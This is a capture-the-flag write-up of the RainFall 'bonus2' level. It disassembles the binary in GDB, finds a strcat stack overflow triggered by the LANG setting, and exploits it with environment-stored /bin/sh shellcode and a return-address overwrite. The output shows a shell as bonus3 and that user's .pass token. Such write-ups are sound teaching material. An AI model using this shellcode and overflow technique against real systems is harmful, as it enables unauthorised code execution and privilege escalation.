# Bonus2

## Exploring the binary
```shell
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 phantom
bonus2@RainFall:~$ ./bonus2 phantom phantom
Hello phantom
```
It seems that this binary accepts 2 argument values and prints 'Hello' together with <code>av[1]</code>.

## GDB analysis
```shell
Dump of assembler code for function main:
   0x08048529 <+0>:	push   %ebp
   0x0804852a <+1>:	mov    %esp,%ebp
   0x0804852c <+3>:	push   %edi
   0x0804852d <+4>:	push   %esi
   0x0804852e <+5>:	push   %ebx
   0x0804852f <+6>:	and    $0xfffffff0,%esp
   0x08048532 <+9>:	sub    $0xa0,%esp
   0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    $0x1,%eax
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    0x50(%esp),%ebx
   0x0804854c <+35>:	mov    $0x0,%eax
   0x08048551 <+40>:	mov    $0x13,%edx
   0x08048556 <+45>:	mov    %ebx,%edi
   0x08048558 <+47>:	mov    %edx,%ecx
   0x0804855a <+49>:	rep stos %eax,%es:(%edi)
   0x0804855c <+51>:	mov    0xc(%ebp),%eax
   0x0804855f <+54>:	add    $0x4,%eax
   0x08048562 <+57>:	mov    (%eax),%eax
   0x08048564 <+59>:	movl   $0x28,0x8(%esp)
   0x0804856c <+67>:	mov    %eax,0x4(%esp)
   0x08048570 <+71>:	lea    0x50(%esp),%eax
   0x08048574 <+75>:	mov    %eax,(%esp)
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    0xc(%ebp),%eax
   0x0804857f <+86>:	add    $0x8,%eax
   0x08048582 <+89>:	mov    (%eax),%eax
   0x08048584 <+91>:	movl   $0x20,0x8(%esp)
   0x0804858c <+99>:	mov    %eax,0x4(%esp)
   0x08048590 <+103>:	lea    0x50(%esp),%eax
   0x08048594 <+107>:	add    $0x28,%eax
   0x08048597 <+110>:	mov    %eax,(%esp)
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	movl   $0x8048738,(%esp)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)
   0x080485ba <+145>:	je     0x8048618 <main+239>
   0x080485bc <+147>:	movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
   0x080485cc <+163>:	mov    0x9c(%esp),%eax
   0x080485d3 <+170>:	mov    %eax,(%esp)
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   %eax,%eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	movl   $0x1,0x8049988
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:	mov    0x9c(%esp),%eax
   0x08048602 <+217>:	mov    %eax,(%esp)
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   %eax,%eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	movl   $0x2,0x8049988
   0x08048618 <+239>:	mov    %esp,%edx
   0x0804861a <+241>:	lea    0x50(%esp),%ebx
   0x0804861e <+245>:	mov    $0x13,%eax
   0x08048623 <+250>:	mov    %edx,%edi
   0x08048625 <+252>:	mov    %ebx,%esi
   0x08048627 <+254>:	mov    %eax,%ecx
   0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    -0xc(%ebp),%esp
   0x08048633 <+266>:	pop    %ebx
   0x08048634 <+267>:	pop    %esi
   0x08048635 <+268>:	pop    %edi
   0x08048636 <+269>:	pop    %ebp
   0x08048637 <+270>:	ret
```
The main function calls <code>getenv()</code> to retrieve an environmental variable. It makes a few <code>memcmp()</code> calls and also calls the <code>greetuser()</code> function. The env is copied into <code>0x8048738</code> and compared to 2 different strings:
```shell
(gdb) x/s 0x8048738
0x8048738:	 "LANG"
(gdb) x/s 0x804873d
0x804873d:	 "fi"
(gdb) x/s 0x8048740
0x8048740:	 "nl"
```
Depending on the result of the comparison, a variable at <code>0x08049988</code> is assigned a value of <code>0x1</code> (1) or <code>0x2</code> (2). We then look for all global variables to identify it:
``` shell
All defined variables:

Non-debugging symbols:
0x08048708  _fp_hw
0x0804870c  _IO_stdin_used
0x0804886c  __FRAME_END__
0x08049870  __CTOR_LIST__
0x08049870  __init_array_end
0x08049870  __init_array_start
0x08049874  __CTOR_END__
0x08049878  __DTOR_LIST__
0x0804987c  __DTOR_END__
0x08049880  __JCR_END__
0x08049880  __JCR_LIST__
0x08049884  _DYNAMIC
0x08049950  _GLOBAL_OFFSET_TABLE_
0x08049978  __data_start
0x08049978  data_start
0x0804997c  __dso_handle
0x08049980  completed.6159
0x08049984  dtor_idx.6161
0x08049988  language
```
Now we know that the global variable <code>language</code> is set to either 1 or 2, depending on whether <code>LANG</code> is set to Finnish or Dutch. Next, we look at the <code>greetuser()</code> function:
```shell
Dump of assembler code for function greetuser:
   0x08048484 <+0>:	push   %ebp
   0x08048485 <+1>:	mov    %esp,%ebp
   0x08048487 <+3>:	sub    $0x58,%esp
   0x0804848a <+6>:	mov    0x8049988,%eax
   0x0804848f <+11>:	cmp    $0x1,%eax
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    $0x2,%eax
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   %eax,%eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
   0x0804849d <+25>:	mov    $0x8048710,%edx
   0x080484a2 <+30>:	lea    -0x48(%ebp),%eax
   0x080484a5 <+33>:	mov    (%edx),%ecx
   0x080484a7 <+35>:	mov    %ecx,(%eax)
   0x080484a9 <+37>:	movzwl 0x4(%edx),%ecx
   0x080484ad <+41>:	mov    %cx,0x4(%eax)
   0x080484b1 <+45>:	movzbl 0x6(%edx),%edx
   0x080484b5 <+49>:	mov    %dl,0x6(%eax)
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    $0x8048717,%edx
   0x080484bf <+59>:	lea    -0x48(%ebp),%eax
   0x080484c2 <+62>:	mov    (%edx),%ecx
   0x080484c4 <+64>:	mov    %ecx,(%eax)
   0x080484c6 <+66>:	mov    0x4(%edx),%ecx
   0x080484c9 <+69>:	mov    %ecx,0x4(%eax)
   0x080484cc <+72>:	mov    0x8(%edx),%ecx
   0x080484cf <+75>:	mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:	mov    0xc(%edx),%ecx
   0x080484d5 <+81>:	mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:	movzwl 0x10(%edx),%ecx
   0x080484dc <+88>:	mov    %cx,0x10(%eax)
   0x080484e0 <+92>:	movzbl 0x12(%edx),%edx
   0x080484e4 <+96>:	mov    %dl,0x12(%eax)
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    $0x804872a,%edx
   0x080484ee <+106>:	lea    -0x48(%ebp),%eax
   0x080484f1 <+109>:	mov    (%edx),%ecx
   0x080484f3 <+111>:	mov    %ecx,(%eax)
   0x080484f5 <+113>:	mov    0x4(%edx),%ecx
   0x080484f8 <+116>:	mov    %ecx,0x4(%eax)
   0x080484fb <+119>:	mov    0x8(%edx),%ecx
   0x080484fe <+122>:	mov    %ecx,0x8(%eax)
   0x08048501 <+125>:	movzwl 0xc(%edx),%edx
   0x08048505 <+129>:	mov    %dx,0xc(%eax)
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    0x8(%ebp),%eax
   0x0804850d <+137>:	mov    %eax,0x4(%esp)
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax
   0x08048514 <+144>:	mov    %eax,(%esp)
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax
   0x0804851f <+155>:	mov    %eax,(%esp)
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   0x08048527 <+163>:	leave
   0x08048528 <+164>:	ret
```
This function uses <code>strcat()</code> to join two strings. Depending on the value of <code>language</code>, it loads the first string from three different addresses: 1 for Finnish (jump to +54), 2 for Dutch (jump to +101), and a default for English (jump to +134). It then joins this first string with the string passed to the function (<code>av[2]</code>). The final string, which greets the second string entered in the binary call, is displayed using <code>puts()</code>.
```shell
(gdb) x/s 0x8048717
0x8048717:	 "Hyvää päivää "
(gdb) x/s 0x804872a
0x804872a:	 "Goedemiddag! "
(gdb) x/s 0x8048710
0x8048710:	 "Hello "
```

## Buffer overrun attack
Since the <code>greetuser()</code> function uses <code>strcat()</code>, it will be vulnerable to a <code>buffer overflow</code> attack once again. To find the offset, we use the ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)) tool as we did previously and set the environmental variable <code>LANG</code> to one of the two languages to make the string longer compared to English. It does not matter which language we choose, because both foreign language greetings have the same length.
``` shell
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ gdb ./bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) run $(python -c "print '\x90' * 40") 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
Starting program: /home/user/bonus2/bonus2 $(python -c "print '\x90' * 40") 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
Hyvää päivää ����������������������������������������Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()

```
Now we know the offset is equal to 18. As there is no direct call to <code>/bin/sh</code> in the whole code, we opt to use <code>shellcode</code> as in <code>bonus0</code>:
``` shell
bonus2@RainFall:~$ export SCODE=`python -c 'print("\x90" * 150 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
bonus2@RainFall:/tmp$ cc addr.c -o addr
bonus2@RainFall:/tmp$ ./addr
SCODE set at 0xbffff85c
```
Based on the information from <code>main()</code>, we know that <code>0x28</code> (40) bytes are copied from <code>av[1]</code>. With this knowledge, we can now construct the exploit.

## Exploit
``` shell
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xbf\xff\xf8\x5c"[::-1]')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB\���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
